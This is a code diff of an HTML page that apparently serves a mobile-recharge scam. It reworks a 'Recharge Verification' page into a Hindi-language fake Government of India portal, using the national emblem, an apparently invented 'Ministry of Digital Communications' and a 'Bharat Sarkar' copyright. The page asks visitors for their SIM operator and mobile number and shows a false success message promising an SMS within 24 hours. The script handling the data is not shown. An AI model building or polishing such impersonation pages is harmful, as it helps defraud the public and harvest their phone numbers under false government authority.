@@ -1,47 +1,64 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="hi">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Recharge Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>भारत सरकार - मोबाइल रिचार्ज सहायता पोर्टल</title>
   <link rel="stylesheet" href="style.css" />
 </head>
 <body>
-  <div class="container">
-    <div class="preview-card">
-      <img
-        src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Emblem_of_India_%28navy_blue%29.svg"
-        alt="India Emblem"
-        class="emblem"
-      />
-      <h2>Government of India</h2>
-      <p>Recharge Verification Portal</p>
-    </div>
+  <header>
+    <img
+      src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Emblem_of_India_%28navy_blue%29.svg"
+      alt="India Emblem"
+      class="emblem"
+    />
+    <h1>भारत सरकार - मोबाइल रिचार्ज सहायता पोर्टल</h1>
+    <p>Ministry of Digital Communications - Recharge Facilitation System</p>
+  </header>
 
+  <main>
     <form id="rechargeForm">
-      <label for="phone">Enter Mobile Number:</label>
+      <label for="sim">सिम का चयन करें:</label>
+      <select id="sim" required>
+        <option value="">-- चयन करें --</option>
+        <option value="Airtel">Airtel</option>
+        <option value="Jio">Jio</option>
+        <option value="Vi">Vi</option>
+        <option value="BSNL">BSNL</option>
+      </select>
+
+      <label for="mobile">मोबाइल नंबर दर्ज करें:</label>
       <input
         type="tel"
-        id="phone"
-        name="phone"
-        pattern="[0-9]{10}"
+        id="mobile"
+        placeholder="10 अंकों का मोबाइल नंबर"
+        maxlength="10"
         required
       />
-      <button type="submit">Verify Number</button>
-    </form>
-  </div>
 
-  <div id="popup" class="popup hidden">
-    <div class="popup-content">
+      <button type="submit" id="submitBtn">जमा करें</button>
+      <div id="loadingSpinner"></div>
+    </form>
+  </main>
+
+  <!-- Modal popup -->
+  <div id="popupModal" class="modal">
+    <div class="modal-content">
       <img
         src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Emblem_of_India_%28navy_blue%29.svg"
         alt="India Emblem"
         class="emblem"
       />
-      <h2>Verifying your number...</h2>
-      <p>Please wait while we process your request.</p>
+      <p>✅ आपका रिचार्ज अनुरोध सफलतापूर्वक जमा हो गया है।</p>
+      <p>24 घंटे के अंदर आपको SMS प्राप्त होगा।</p>
+      <button id="closePopup">ठीक है</button>
     </div>
   </div>
+
+  <footer>
+    © 2025 Bharat Sarkar | भारत सरकार द्वारा संरक्षित
+  </footer>
 
   <script src="script.js"></script>
 </body>
